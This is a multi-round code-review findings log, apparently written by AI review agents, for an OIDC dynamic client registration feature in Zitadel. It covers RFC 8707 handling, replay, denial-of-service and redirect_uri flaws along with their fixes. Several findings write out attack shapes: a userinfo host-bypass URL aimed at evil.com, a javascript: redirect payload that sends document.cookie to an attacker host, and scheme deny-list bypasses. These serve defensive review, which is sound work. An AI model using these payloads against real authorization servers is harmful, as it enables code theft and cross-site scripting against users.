---
created: "2026-04-24T13:30:00Z"
last_edited: "2026-04-27T11:00:00Z"
---
# Codex Peer Review — Tier 0 Findings

Build site: context/plans/build-site.md
Tier: 0
Base ref: cc74a36b6 (pre-tier-0 main HEAD)
Reviewer: Codex gpt-5-codex
Review date: 2026-04-24

## Findings

| ID | Severity | File | Line | Description | Status |
|----|----------|------|------|-------------|--------|
| F-001 | P1 | internal/api/oidc/token_exchange.go | 44 | T-004 removed the `resource`-parameter rejection from `/token` token-exchange but the remainder of RFC 8707 (audience plumbing via T-014/T-027/T-045, allow-list validation via T-026) has not landed yet. Today a request with `resource=...` succeeds and mints a token whose `aud` claim never reflects the supplied resource — this is worse than the prior explicit `invalid_target` rejection per RFC 8707 §2 (AS should return `invalid_target` when it cannot honor the resource). Either keep rejecting until T-026/T-027/T-045 land, or accelerate the propagation pipeline so there is never a gap. | RESOLVED-AUTHORIZE / OPEN-TOKEN |

## Resolution status (2026-04-26)

**/authorize path: CLOSED.** Tier 2 cluster T-026 + T-027 + T-028 (commits 3124fd94a, 2591cb012) shipped together as the F-001 closer per Option B. The /authorize sidecar now validates `resource` against `AllowedAudiences` and rejects out-of-list values with the RFC 8707 §2 `invalid_target` 400 envelope BEFORE the request reaches the auth-request creation path; in-list values are merged into `OIDCSession.Audience` and surface in the issued access-token `aud` claim.

**/token path: still open until T-045 (Tier 3).** The 6 token grant handlers (token_code, refresh, client_credentials, device, exchange, jwt_profile) do not yet call `ValidateResources` or `writeInvalidTargetError`; the helpers and the typed `IsInvalidTargetError` predicate are in place so T-045 is a one-liner per handler. Until T-045 lands, a /token request with `resource=...` still mints a token whose `aud` does not reflect the resource — same behavior as before the cluster, but now device-flow tokens DO get the merge because device-auth shares the `/authorize` sidecar pre-validation entry.

Recommend marking F-001 as RESOLVED only after T-045 + T-046 close /token coverage.

## Recommended remediation

Option A (revert + sequence): revert T-004 and land it together with T-026 at Tier 2 so the parameter is only accepted once the allow-list gate exists, then wire propagation at T-027/T-045.

Option B (accelerate): land T-026/T-027 (Tier 2) in the same tier cadence as T-004, i.e., bundle the gate + propagation so acceptance and enforcement ship together. T-045 (Tier 3) can follow separately since it only extends existing behavior to more grants.

Option C (interim gate): replace the removed rejection with a narrower interim rejection that (a) rejects syntactically invalid URIs with `invalid_target`, (b) accepts valid URIs but continues to omit them from `aud` until T-027 lands, and (c) ships a CHANGELOG / release-note warning flagging the interim gap.

Recommendation: **Option B** — bundling T-004 with T-026/T-027 into a single coherent change preserves RFC 8707 contract semantics at all tier boundaries. The build-site ordering that placed T-004 in Tier 0 and T-027 in Tier 2 introduces an unnecessary correctness gap across tier commits.

Decision owner: human (user). Waiting on direction before revert or bundling.

## Update (2026-04-24, post-T-013 code-ready)

T-013 (upstream `github.com/zitadel/oidc` PR) is now code-complete on
`../oidc` branch `feat/authrequest-resource-rfc8707`. Once that PR
merges and Zitadel bumps the dep past the merge SHA, `r.Data.Resource`
will be available on `AuthRequest` in the `/authorize` path, so T-014
can wire propagation directly — no sidecar needed. This adds a new
remediation option:

- **Option D (new)**: land the upstream PR first, bump the dep, then
  land T-014+T-026+T-027+T-045 in a single coherent PR that closes
  the F-001 window. T-004 stays as-is because the next-tier code path
  uses the accepted `resource` value. This is the cleanest outcome
  when the upstream merge has a short SLA.

Preferred path depends on upstream merge timeline. Short SLA →
Option D; long SLA → Option B (bundle T-004+T-026+T-027 in Tier 2
with the interim sidecar from T-012).

---

# /ck:check Findings — 2026-04-27 (Tier 0–3 mid-build review)

Build site: context/plans/build-site.md
Tier reviewed: 0–3 (38 of 86 tasks DONE)
Base ref: 3220f3d9a (pre-Tier-2 main)
Reviewer: ck:inspector (opus) + ck:surveyor (opus) + ck:verifier (opus)
Review date: 2026-04-27

## Findings

| ID | Severity | File | Line | Description | Status |
|----|----------|------|------|-------------|--------|
| F-100 | **P0** | internal/api/oidc/dcr/validate.go | 297-317 (extractHost) + 284-295 (matchesAnyHostPattern) | `AllowedRedirectURIHostPatterns` bypass via URL userinfo. extractHost cuts on `://`, `/`, `?`, `#` then splits port on `:` but never strips the RFC 3986 userinfo segment before `@`. URL `https://app.example.com:8080@evil.com/cb` parses to host=`app.example.com` and matches `*.example.com`; real host is `evil.com`. **Authorization-code exfiltration** — attacker registers a client with attacker-controlled DNS, defeats the host allow-list, steals codes via the malicious redirect. validate_test.go covers wildcards/IPv6/exact match but ZERO userinfo-bearing URLs. Reveals **kit gap** in cavekit-register-handler.md R4 — host-extraction algorithm unpinned. | RESOLVED 2026-04-27 (kit ae of cavekit-register-handler.md R4 + fix in dcr/validate.go: `net/url.Parse` + `u.Hostname()` + reject `u.User != nil`; 4 bypass shapes pinned by TestValidateAndClampMetadata_R4_UserinfoBypassRejected) |
| F-101 | **P0** | internal/api/oidc/dcr/auth.go | 178 (dummyPassWapHash) + internal/command/iat.go:328-343 (VerifyIATPlaintext) + cmd/defaults.yaml:984-998 | Anti-enumeration dummy hash defeats itself — **INVERTED timing oracle**. dummyPassWapHash hardcoded as `$argon2id$v=19$m=65536,t=2,p=1$...` but cmd/defaults.yaml ships `Algorithm: bcrypt` with empty `Verifiers` list. passwap.Swapper.Verify on `$argon2id$`-encoded string returns ErrNoVerifier immediately — zero crypto work. Real bcrypt-cost-4 verify takes ~5ms; dummy returns in microseconds. not-found / malformed / cross-instance paths now MEASURABLY FASTER than wrong-random — *inverted* oracle, **worse than no defence**. auth_test.go stubVerifier short-circuits on `encoded == s.matchHash` so unit tests never decode the dummy. Reveals **kit gap** in cavekit-iat.md R4 anti-enum AC — dummy hash is unspecified relative to the configured hasher. | RESOLVED 2026-04-27 (kit amendment splits AC into 3: provenance + startup probe + real-Passwap timing test; fix introduces `dcr.BuildAntiEnumDummyHash` + `dcr.RegistrationDeps` + `dcr.NewHandler` wiring scaffold; start.go now constructs deps from configured secretHasher with ErrNoVerifier panic probe; ResolveIAT signature takes dummy hash via parameter not package literal; F-102 dead-code closed by the wiring) |
| F-102 | P1 | internal/api/oidc/dcr/auth.go | 198-257 (ResolveIAT) | T-037 production path is dead code. `grep -rn "ResolveIAT\|ParseIATPlaintext"` finds zero non-test callers. T-040 dispatcher (consumer) still pending. Kit edit + tests claim "T-037 lands in full" but no production code reaches the function — F-101 cannot surface in any integration test because nothing reaches ResolveIAT. T-037 should be downgraded from DONE to PARTIAL until T-040 lands the wiring. F-101 fix (move dummy-hash construction to wiring site) addresses both. | RESOLVED 2026-04-27 (the F-101 fix landed `dcr.NewHandler(deps)` constructor wired from `cmd/start/start.go`; `BuildAntiEnumDummyHash(commands.SecretHasher())` now has a real production caller. T-040 will fill in the actual handler bodies that invoke ResolveIAT — the deps + scaffolding are ready) |
| F-103 | P1 | internal/api/oidc/dcr/validate.go:104 + internal/domain/application_oidc.go (rfc7591ResponseTypes) | response_types clamp is whitespace-order-sensitive. RFC 6749 §3.1.1 defines value as a **space-separated SET** — `"token id_token"` MUST equal `"id_token token"`. Clamp does exact `slices.Contains`; domain mapper switches on literal string. Spec-compliant clients sending `"token id_token"` get 400. Reveals kit gap in cavekit-register-handler.md R2 + R4 (response_types semantics not spec'd). | RESOLVED 2026-04-27 (kit AC adds canonicalization: tokens split on whitespace + sorted alphabetically + joined; mirrors zitadel/oidc/v3 canonical spelling so no inconsistency w/ existing OIDC stack. Fix adds `canonicaliseResponseType` + `intersectResponseTypes`; allow-list spelling preserved on output. 5 subtests P incl. non-canonical-vs-canonical, extra-whitespace, single-token, disallowed-rejected) |
| F-104 | P2 | internal/api/grpc/admin/iat.go:93-108 + internal/query/initial_access_tokens_search.sql | ListInitialAccessTokens lying API contract — proto declares ListQuery + ListDetails; impl ignores both. SQL has no LIMIT/OFFSET; ListDetails never populated. Trim proto or implement pagination. cavekit-iat.md R6 + impl drifted. | NEW |
| F-105 | P2 | apps/api/test-integration-api.yaml + context/impl/impl-config.md (T-048) | Anonymous-mode integration coverage silently deferred. T-048 sets `RequireInitialAccessToken=true`, gating AC4/AC5 anonymous resolution to unit-test only. No follow-up task tracks this. Add an integration-fixture variant with anonymous mode + DefaultProjectID/DefaultOrgID set via instance-feature commands. | NEW |
| F-106 | P3 | internal/query/projection/initial_access_token.go:170 + internal/query/initial_access_token.go:37 | consumed_slots SMALLINT[] silently overflows at use_index 32768 on finite=true tokens with very high max_uses. Document a kit-level cap on max_uses ≤ 32767, OR migrate column to INT[]. Inspector flagged this in Tier 2 review; restated. | OPEN |

## Verdict

**REJECT** — 2 P0 findings block forward progress. T-040 (RegisterClient keystone) MUST NOT land until F-100 + F-101 are routed through `/ck:revise --trace --from-finding F-100` / `F-101`. Both reveal kit gaps that need backprop, not just code fixes.

## Recommended next actions

1. **Route F-100 and F-101 through `/ck:revise --trace`** — both reveal kit gaps requiring user-approved kit amendments before code fixes. F-100 amends cavekit-register-handler.md R4 to pin the host-extraction algorithm (use net/url + reject userinfo). F-101 amends cavekit-iat.md R4 to require the dummy hash come from the same hasher instance + adds a startup probe AC.
2. **Bundle F-102 into F-101 fix** — moving dummy-hash construction to a wiring-site initialization call also gives ResolveIAT a real production caller as soon as T-040 ships.
3. **Defer F-103 / F-104 / F-105 / F-106** — log + revisit at next /ck:check boundary; not blocking.
4. **Downgrade T-037 status** — flip from DONE to PARTIAL in `context/impl/impl-register-handler.md` until T-040 wiring lands.


---

# /ck:check Findings — 2026-04-27 (Tier 3 close-out — second pass)

Build site: context/plans/build-site.md
Tier reviewed: 3 close-out (loop window 9e6f0435c..84c36d160 → 10 task commits + 1 wiring fix)
Base ref: 9e6f0435c (previous /ck:check REJECT verdict — F-100/F-101/F-102/F-103 all RESOLVED)
Reviewers: ck:verifier (opus) + ck:surveyor (opus) + ck:inspector (opus, code) + ck:inspector (opus, security audit). Codex skipped — wrappers absent in repo.
Review date: 2026-04-27

## Findings

| ID | Severity | Vector | File | Description | Status |
|----|----------|--------|------|-------------|--------|
| F-200 | **P0** | auth/anti-replay | internal/api/oidc/dcr/wire.go:285-323 + internal/command/dynamic_client_registration.go:97-99 + cmd/start/start.go:716-742 | **IAT slot is NEVER consumed.** `ResolveIAT` doc says caller MUST consume; `RegisterClient` doc says caller MUST have already consumed; the dispatcher doesn't; the start.go closure doesn't. `grep -rn ConsumeInitialAccessToken internal/api/oidc/ internal/command/dynamic_client_registration.go` returns ZERO call sites. Any valid IAT can be replayed unboundedly to register N clients regardless of MaxUses. The R2 race-safety harness, the per-slot UniqueConstraint, and the Errors.DCR.IAT.Exhausted error path are all dead code in production. | NEW |
| F-201 | **P0** | secret/persistence | internal/api/oidc/dcr/wire.go:186 + wire.go:329 + internal/api/oidc/dcr/response.go:177 + cmd/start/start.go:716-742 | **client_secret_expires_in dropped.** `RegisterResult` carries no `ClientSecretExpiresIn` field; dispatcher leaves `RegistrationOutput.ClientSecretExpiresIn` zero; `clientSecretExpiresAtFor` returns 0 ("no expiry" sentinel). `config.OIDC.DCR.ClientSecretExpiresIn` (op.go:74) is never threaded through. Every issued client_secret advertises "never expires" regardless of policy. | NEW |
| F-217 | **P0** | auth/tenancy | cmd/start/start.go:744 | **DCR handler mounted WITHOUT instanceInterceptor + WITHOUT limitingAccessInterceptor.** Compare to login/idp/saml mounts which wrap both. `authz.GetInstance(ctx)` returns `emptyInstance` → `featureGateMiddleware` reads `emptyInstance.Features().DynamicClientRegistration` (always false) so endpoint is unreachable in default config; if any host-routing layer side-steps this, anonymous DCR registrations persist with `instance_id=""` (cross-tenant). No rate limit on what is by design an unauthenticated, write-amplifying endpoint. | NEW |
| F-203 | **P0** | rfc8707/refresh | internal/api/oidc/token_refresh.go:29-37 + internal/api/oidc/rfc8707_token.go:60-63 | **v2 refresh-token path skips RFC 8707 §2.2 narrowing.** Only `refreshTokenV1` (line 59) calls `narrowAudienceByTokenResources`. The primary `RefreshToken` (line 29) calls `ExchangeOIDCSessionRefreshAndAccessToken` and never reads `ResourcesFromContext`. v2 refresh requests with `resource=...` either silently broaden or silently ignore. F-001 `/token` closure only complete for V1. | NEW |
| F-218 | **P1** | redir/XSS | internal/domain/application_oidc.go:300-308,340-349 (consumed at internal/api/oidc/dcr/validate.go:267) | **`javascript:` / `data:` / `file:` redirect_uris accepted for `application_type=native`.** Compliance code only special-cases http/https; any other scheme falls into `containsCustom` and is allowed. Combined with `isLoopbackHTTP` short-circuit, custom-scheme URIs bypass `AllowedRedirectURIHostPatterns`. A registered client with `redirect_uris=["javascript:fetch('https://attacker/?'+document.cookie)"]` and `application_type=native` is persisted; any /authorize flow against that client_id delivers XSS through the user-agent. | NEW |
| F-202 | P1 | info-leak/header | internal/api/oidc/dcr/wire.go:346-353 | `writeDispatchError` falls back to `WriteError(w, 500, ErrCodeInvalidClientMetadata, err.Error())`. DB / eventstore push errors leak zerror IDs (COMMA-..., DCR-RC005), wrapped error chains, possibly SQL state to unauthenticated callers. Wrong envelope code too (DB failure ≠ invalid_client_metadata). | NEW |
| F-219 | P1 | sidechannel/auth-order | internal/api/oidc/dcr/wire.go:277-296 | **Decode runs BEFORE auth.** With `RequireInitialAccessToken=true`, an anonymous attacker probes 413/415/400 + JSON-parse fingerprint without ever being challenged for Bearer. The 401 only fires after decode succeeds. Endpoint becomes a free fingerprint surface. R3 implies "401 first when IAT required". | NEW |
| F-204 | P1 | dos/config | internal/api/oidc/dcr/decode.go:99-102 | `MaxBodyBytes==0` from yaml is silently rewritten to 64 KiB, not "unlimited". An admin who explicitly sets MaxRequestBodyBytes=0 (intending no cap) gets the default fallback. No way to disable. `software_statement` JWTs may legitimately exceed 64 KiB. | NEW |
| F-205 | P1 | test-integrity | internal/query/projection/dcr_rollback_test.go:46 | **The "compile-time" size-anchor does NOT detect drift.** `var _ = unsafe.Sizeof(initColumnMirror{}) - unsafe.Sizeof(handler.InitColumn{})` evaluates to a uintptr; subtraction compiles cleanly under any size delta. Mirror could silently misread `nullable` as `defaultValue` if upstream struct grows by a field. | NEW |
| F-206 | P2 | audit-completeness | cmd/start/start.go:716-742 + internal/command/dynamic_client_registration.go:54 | `SoftwareStatementJTI` field exists in `RegisterClientInput` and the audit event but is never populated end-to-end. Phase 2 software_statement work will record empty JTI. Dead code today. | NEW |
| F-207 | P2 | privacy/audit | internal/command/dynamic_client_registration.go:246-253 | **Salt-less SHA-256 of an IPv4 address is brute-forceable** (~2³² keys, minutes on a laptop). Doc says "privacy" but the field is recoverable. HMAC with audit key OR truncate to /24 before hash. | NEW |
| F-208 | P2 | auth/integrity | internal/command/dynamic_client_registration.go:103-152 | `RegisterClient` performs no project-existence check. Anonymous DCR with `DefaultProjectID="non-existent"` pushes 4 events onto an aggregate with no `ProjectAddedEvent` ancestor; projection silently drops the row, eventstore retains orphans. | NEW |
| F-209 | P2 | auth/header | internal/api/oidc/dcr/wire.go:358-366 | `writeAuthError` only sets `WWW-Authenticate` for ClampError with code `invalid_token`; non-ClampError 401 paths fall through to writeDispatchError → 500 + leaked err.Error(). | NEW |
| F-210 | P2 | dos/storage | internal/repository/project/dynamic_client_registration.go:35,37 | Attacker-controlled `ClientNameUnclamped` (up to 64 KiB) and `UserAgent` (HTTP-header-sized, unbounded by stdlib) persisted to eventstore without length cap or sanitization. Log-injection via control chars also possible. | NEW |
| F-211 | P2 | test-integrity | internal/api/oidc/integration_test/rfc8707_resource_test.go:165-176 | Opaque-token fall-through: `if len(parts) != 3 { return nil }` — assertion `Contains(nil, resource1)` fails the test on Zitadel default (opaque tokens), not skips. Test breaks the integration suite. | NEW |
| F-212 | P2 | rfc8707/contract | internal/api/oidc/rfc8707_token.go:60-63 | Empty-intersection guard returns ORIGINAL audience. Per RFC 8707 §2.2 the right answer is `invalid_target` 400 — current behaviour issues a token whose audience differs from what client requested. Sidecar rejects upstream (allowed-list pre-check) but if AllowedAudiences is empty (sentinel: unrestricted), this fires. | NEW |
| F-220 | P2 | dos/auth | internal/api/oidc/dcr/decode.go:103 | `http.MaxBytesReader(nil, r.Body, max)` — first arg should be `http.ResponseWriter` so `Connection: close` fires on overflow. Pipelined attacker keeps connection alive after 413, costs accept-loop time. No rate-limit (see F-217). | NEW |
| F-221 | P2 | auth/parsing | internal/api/oidc/dcr/auth.go:65-74 | `"Bearer\tfoo"` (tab separator per RFC 9110 §11.4) treated as `AuthModeAnonymous` instead of IAT. Misconfigured proxy that uses tab handles a valid IAT to anonymous code path. `Bearer foo bar` keeps internal whitespace in tok. | NEW |
| F-222 | P2 | privacy/header | internal/api/oidc/dcr/wire.go:317 + internal/api/http/header.go:107 | UA + RemoteIPStringFromRequest plumbed un-sanitised. UA un-truncated (control chars + 8KB strings persisted). `RemoteIPStringFromRequest` honours XFF — without trusted-proxy whitelist (and DCR has no instance interceptor per F-217), source IP is spoofable. | NEW |
| F-213 | P3 | quality | internal/api/oidc/dcr/wire.go:368-375 | Dead-code anchor `var _ = func() bool { ... }()` runs at init time uselessly. | NEW |
| F-214 | P3 | testing/coverage | internal/api/oidc/dcr/decode.go:139-143 | "drop client_name#&lt;lang&gt;" comment lacks regression test. | NEW |
| F-215 | P3 | drift-risk | internal/api/oidc/dcr/wire.go:152-159 | Duplicated string consts (`RegMethodAnonymous`/`IAT`) mirror `command.RegistrationMethod*` — drift risk for future enum additions. | NEW |
| F-216 | P3 | observability | internal/api/oidc/dcr/response.go:127 + wire.go:337 | `_ = WriteRegistrationResponse(...)` discards encode error. Partial write means client never sees RAT, events committed, client unusable. | NEW |
| F-223 | P3 | crypto/startup | internal/api/oidc/dcr/wire.go:69-78 | `BuildAntiEnumDummyHash` probe panics only if Verify returns ErrNoVerifier; if a future hasher returns nil error for any input, probe silently accepts. Use TWO different wrong plaintexts. | NEW |
| F-224 | P3 | auth/feature | internal/api/oidc/dcr/handler.go:91 | `featureGateMiddleware` only checks runtime feature flag, not yaml-gate. If yaml gate were ever bypassed, runtime flag becomes single point of control. Defence-in-depth: also consult yaml flag. | NEW |
| F-225 | P3 | csrf | cmd/start/start.go:744 | DCR endpoint has no CORS wrapper — JSON CSRF is naturally blocked by preflight requirement. Anonymous mode means `text/plain` simple-CORS still consumes quota / spans. Document the assumption. | NEW |
| F-226 | P3 | clamp/contract | internal/api/oidc/dcr/validate.go:354-368 | `intersectStringSlice` empty-intersection semantics is comment-only (`// empty allow-list = deny all`). Fragile — make it a typed `(result []string, ok bool)` so future callers can't misread it (would have caught F-212 shape). | NEW |

## Verifier verdict (goal-backward AC check)
**APPROVE** — 51 / 56 ACs MET, 4 PARTIAL (sanctioned deferrals), 1 UNVERIFIABLE (R3 AC4 wording mismatch — semantically equivalent). T-046 flagged as "falsely complete" — strict reading of R5 AC7 ("integration test exercises EACH handler") is PARTIAL when only client_credentials is exercised end-to-end.

## Coverage (Tier 0–3)
- 24 in-scope requirements: 17 COMPLETE / 7 PARTIAL (all sanctioned deferrals to Tier 4-6 doc/integration tasks)
- All 49 Tier 0–3 tasks marked DONE in loop log
- No OVER-BUILT findings

## Verdict

**REJECT** — 4 P0 + 5 P1 findings. Three of the P0s are foundational:
1. **F-200** breaks the central anti-replay invariant of the entire IAT system. Every piece of race-safety work in T-017/T-018 + the per-slot UniqueConstraint mechanism is dead code in production because no one calls `ConsumeInitialAccessToken`.
2. **F-217** mounts the DCR handler without `instanceInterceptor` and without `limitingAccessInterceptor`. Either the endpoint is unreachable (default config — `authz.GetInstance` returns emptyInstance, runtime flag always false) OR if any deployment side-steps the gate, anonymous DCR persists with `instance_id=""` (cross-tenant write). No rate limit on a write-amplifying endpoint.
3. **F-201** + **F-203** are functional regressions on configured fields (client_secret_expires_in always 0; v2 refresh skips RFC 8707 §2.2 narrowing). Both are "wired up but the wire goes nowhere".
4. **F-218** turns DCR into an XSS-distribution channel for any deployment allowing `application_type=native` (the default).

The Tier 3 work shipped with passing tests and clean kits because the test scaffolding never exercised the production-wired `cmd/start/start.go` path end-to-end. The verifier confirms the building blocks individually MET their kit ACs; the inspector + security audit found the assembly is broken.

## Kit gaps revealed (candidates for /ck:revise --trace)

- **F-200** reveals a kit gap: cavekit-register-handler.md R6 + cavekit-iat.md R2 do not pin "the dispatcher MUST consume an IAT slot before commit." This is the same shape as F-101 — kit AC is described in plain English ("consume one use") but the dispatcher contract is unspecified.
- **F-217** reveals a kit gap: no requirement specifies that DCR mounts MUST inherit `instanceInterceptor` + `limitingAccessInterceptor`. cavekit-config.md R3 just says "dual-gate". Add an R: "Mount middleware: DCR handlers MUST be mounted via the same interceptor stack as /oidc/v1/userinfo (instance + rate-limit + access-log + activity)."
- **F-218** reveals a kit gap: cavekit-register-handler.md R4 redirect_uri ACs do not pin a scheme allow-list. After F-100 (host parser bypass) this is the SECOND redirect_uri-related kit gap in the same loop window.
- **F-219** (auth-then-decode order) reveals a kit ambiguity: R3 implies 401 first but does not pin sequencing. The dispatcher invented an order without it being specified.

## Recommended next actions

1. **Block on F-200, F-201, F-217, F-203, F-218** — these MUST land before any Tier 4 work. Route through `/ck:revise --trace --from-finding F-XXX` for each (kit amendments precede code fixes per the post-DE-001 protocol).
2. **F-202, F-204, F-205, F-219** — fix in same batch; these are all dispatcher / decode hardening.
3. **Defer F-206..F-216, F-220..F-226** — log + revisit at Tier 4 boundary; not blocking but should be addressed before Phase 2.
4. **Downgrade T-040 + T-043 status** — flip from DONE to PARTIAL until F-200 + F-201 fixes land. The dispatcher composition is correct (verifier approved) but the production wiring is incomplete.


---

# /ck:check Findings — 2026-04-27 (post-revise verification, third pass)

Build site: context/plans/build-site.md
Reviewed window: 4f1d72016..HEAD (9 fix commits + 2 backprop log commits)
Base ref: 4f1d72016 (previous /ck:check REJECT — F-200/201/202/203/204/205/217/218/219 all RESOLVED in this window)
Reviewers: ck:inspector (opus, code) + ck:inspector (opus, security audit). Verifier dispatched but crashed mid-run (API error); inspectors converged on the same conclusions independently.
Review date: 2026-04-27

## NEW findings (introduced by the fixes themselves)

| ID | Severity | Vector | File | Description | Status |
|----|----------|--------|------|-------------|--------|
| F-301 | **P0** | dos/oom | internal/api/oidc/dcr/decode.go:113-117 + dcr_config.go | **Unbounded body DoS via `MaxRequestBodyBytes=-1` sentinel.** F-204 added `-1 = no cap`. Decoder skips `http.MaxBytesReader` entirely when max ≤ -1 → `io.ReadAll(r.Body)` with NO upper bound. An anonymous attacker (DCR is anonymous-by-default in non-IAT mode) can POST a multi-GB body and pin one goroutine + RAM until OOM. No defence-in-depth ceiling. F-204's kit AC said "no cap" but real systems always need a hard ceiling. | NEW |
| F-300 | P1 | secret/persistence | internal/api/oidc/dcr_config.go:24-103 + response.go:177-180 | **`ClientSecretExpiresIn` not bounded — negative values produce past-timestamp on issue.** F-201 plumbed the lifetime through but DCRConfig.Validate has no clause for ClientSecretExpiresIn. A misconfigured `-24h` flows unchecked into `ClientIDIssuedAt.Add(-24h).Unix()` — handler advertises a freshly-issued secret as already expired. RFC 7591 §3.2.1 sentinel for "no expiry" is `0`; past values are out-of-spec. | NEW |
| N-2 | P1 | ci/build-break | internal/api/oidc/dcr/validate.go:520-529 | **gofmt-dirty after F-218.** `hardRejectedSchemes` map literal not gofmt-clean — `ms-browser-extension` key triggers struct{}{} re-alignment. CI gofmt gates fail. Verified via `gofmt -d`. | NEW |
| N-3 | P1 | ci/build-break | internal/api/oidc/dcr/wire.go:189-196,203-204 | **gofmt-dirty after F-201.** `RegisterRequest` and `RegisterResult` struct field alignment broken by added `ClientSecretExpiresIn` field. Verified via `gofmt -d`. | NEW |
| N-4 | P1 | observability | internal/api/oidc/dcr/wire.go:403-413 | **F-202 logs via `slog.WarnContext(context.Background(), ...)`.** Background context loses tracing IDs / instance ID / request correlation — operator gets a structured 500 log line they cannot correlate to the failed request. Defeats the entire point of `*Context` slog variants. All 5 call sites already have ctx in scope. | NEW |
| N-5 | P1 | rfc-vocabulary | internal/api/oidc/dcr/wire.go:309-314 | **F-219 401 description "Authorization Bearer header is required"** doesn't follow RFC 6750 §3 phrasing ("missing access token"). Inconsistent error vocabulary across the trace pass — F-202's R8 amendment dictates fixed strings ("internal server error"); F-219 invented a different one. | NEW |
| N-6 | P1 | iat/dos-amplification | internal/api/oidc/dcr/wire.go:337-345 (F-200 placement) | **IAT slot consumed BEFORE clamp.** If clamp rejects (invalid metadata, bad redirect URI), the IAT slot is burned but no app registered. With MaxUses=1, an attacker who steals one valid IAT can burn N slots by sending N bad bodies. F-200's kit AC didn't address consume-vs-clamp ordering — the dispatcher chose consume-first which optimises for the race window but creates a DoS amplification. | NEW |
| F-302 | P2 | dos/quota-drain | cmd/start/start.go:792 + internal/api/http/middleware/access_interceptor.go:127-152 | **F-217 wrap order drains tenant quota on feature-disabled probes.** Chain is `instanceInterceptor → limitingAccessInterceptor → featureGateMiddleware → mux`. Rate limiter consumes quota BEFORE the feature gate's 403. An attacker who finds a tenant with `DynamicClientRegistration=false` can spam /oidc/v1/register to drain that tenant's quota. No refund path. | NEW |
| F-303 | P2 | xss/scheme-bypass | internal/api/oidc/dcr/validate.go:520-563 | **F-218 deny-list is suffix-blind.** `intent.action:`, `data.evil:`, `file.app:`, `javascript.foo:` all pass the reverse-domain check (alphanumeric + dot) and bypass the literal deny-list. The headline Android XSS family `intent:` is rejected (no dot) but `intent.foo:` slips through. | NEW |
| F-304 | P2 | iat/race-window | cmd/start/start.go:749-780 | **F-200 IAT row read TWICE (auth.go::ResolveIAT + start.go::ConsumeIAT closure).** Not transactional; an admin revoke between reads produces a stale snapshot for the consume validation. Only the eventstore aggregate-version check protects against double-spend. The contract that "lookup-then-consume is safe" is not pinned. | NEW |
| N-9 | P2 | response-correctness | internal/api/oidc/dcr/response.go:176-181 | **`client_secret_expires_at` advertised when no secret was issued.** `clientSecretExpiresAtFor` only checks `ClientSecretExpiresIn==0`. With auth_method=none + ClientSecretExpiresIn=24h, response says `client_secret_expires_at = issued_at + 24h` for a non-existent secret. RFC 7591 §3.2.1 says the field describes the issued secret. | NEW |
| N-10 | P2 | dead-code | internal/api/oidc/dcr/decode.go:107-112 | **F-204 left a `case max == 0: max = DefaultMaxBodyBytes` fallback** "for the test path". Future maintainers see "0 → 64 KiB" semantics that contradict the kit ("0 is INVALID"). Either delete (force tests to set explicit value) or `panic("unreachable")`. | NEW |
| F-305 / N-11 | P2 | encoding-corruption | internal/api/oidc/dcr/errors.go:87-99 | **`SanitiseErrorDescription` truncates by byte count, not rune count.** A multi-byte UTF-8 sequence split mid-byte produces invalid UTF-8 → json.Marshal silently substitutes U+FFFD. User-facing description ends in `�`; downstream log aggregators may emit warnings or drop the line. | NEW |
| N-7 | P2 | brittle-test | internal/api/oidc/dcr/dispatcher_test.go:480 | **F-200 source-inspection test asserts the literal substring `deps.ConsumeIAT(ctx, regCtx)`.** Any refactor (variable extraction, formatter switch) silently breaks the regression guard while the contract is still satisfied. Should be a behavioural test (instrument a recording closure, assert call count). | NEW |
| N-8 | P2 | brittle-test | cmd/start/dcr_mount_test.go:44 | **F-217 mount test depends on exact `\n\t\t` indentation** for `apis.RegisterHandlerOnPrefix`. If start.go is refactored or indentation changes, test reports false-negative. | NEW |
| N-13 | P3 | wasted-compute | internal/api/oidc/dcr/validate.go:543 | F-218's `s := strings.ToLower(scheme)` is redundant — `net/url.Parse` already lowercases `URL.Scheme` per RFC 3986 §3.1. | NEW |
| N-12 | P3 | size-guard-incomplete | internal/query/projection/dcr_rollback_test.go:50-61 | **F-205 init() guard compares only sizes.** Two structs with identical total size but reordered fields would pass. Should also check `unsafe.Offsetof` for each mirrored field. | NEW |
| N-14 / F-306 | P3 | dual-source-of-truth | internal/api/oidc/token_refresh.go:31-37 | **F-203 response-only narrowing creates persisted-vs-JWT audience divergence.** Persisted access_token event records audience X (broad); JWT `aud` claim is X∩resources (narrow). Introspection / token-info / replay queries return a different audience than the JWT itself for the same token. v2 amplifies this because v2 sessions are longer-lived than v1. | NEW |
| F-307 | P3 | log-injection | internal/api/oidc/dcr/errors.go:94 + decode.go:93,149 | **`SanitiseErrorDescription` keeps `\t` (tab).** Tab-separated log formats can be confused by attacker-supplied `Content-Type: "application/json\t<faked_log_line>"`. Should drop `\t` exception or escape it. | NEW |

## Verdict

**REVISE** — 1 P0 + 6 P1 + 8 P2 + 5 P3.

The 9 originally-reported findings (F-200..F-205, F-217..F-219) ARE resolved. But the fixes themselves introduced fresh issues — most notably F-301, where F-204's `-1 = no cap` sentinel removed the `MaxBytesReader` wrap entirely, exposing the endpoint to unbounded-body DoS. Two CI-breaking gofmt issues (N-2, N-3) would block merge immediately on any project with a gofmt gate.

This is the second time in this build window that a "fix" has shipped without exercising the production wiring path end-to-end. The pattern is clear: source-inspection tests + unit-level coverage are insufficient — the loop needs an integration smoke that boots the dispatcher with the real start.go closure once per /ck:make wave.

## Pattern observation (meta)
The previous /ck:check flagged that the cavekit-writing skill should pin "every defensive call's producer + consumer + sequencing constraint" (3rd `unspecified-handler-contract` entry triggered the recommendation). This /ck:check adds a fresh meta-pattern:

> **`fix-introduces-its-own-regression`** — F-204 (no-cap), F-201 (no-secret-but-expires-at), F-200 (consume-before-clamp). All three fixes shipped passing tests + clean kits because the test scaffolding never exercised the production-wired cmd/start/start.go path end-to-end. The Tier 3 close-out had the SAME pattern (F-200 IAT consume was non-existent in production despite passing tests).

Recommended skill amendment: any /ck:revise --trace fix that touches the dispatcher pipeline (decode/auth/clamp/register/respond) MUST add at least one test that constructs `RegistrationDeps` matching the production start.go shape and exercises the full pipeline end-to-end via `httptest.NewRecorder`. Stub-driven unit tests are necessary but not sufficient.

## Recommended next actions

1. **Block on F-301** — unbounded body DoS is a live regression. Either remove the `-1` sentinel OR impose a hard ceiling (e.g. 100 MiB) even when "uncapped".
2. **`gofmt -w internal/api/oidc/dcr/validate.go internal/api/oidc/dcr/wire.go`** — fix the CI breakers immediately. (Could be done now, NOT through `/ck:revise --trace` since it's no kit gap.)
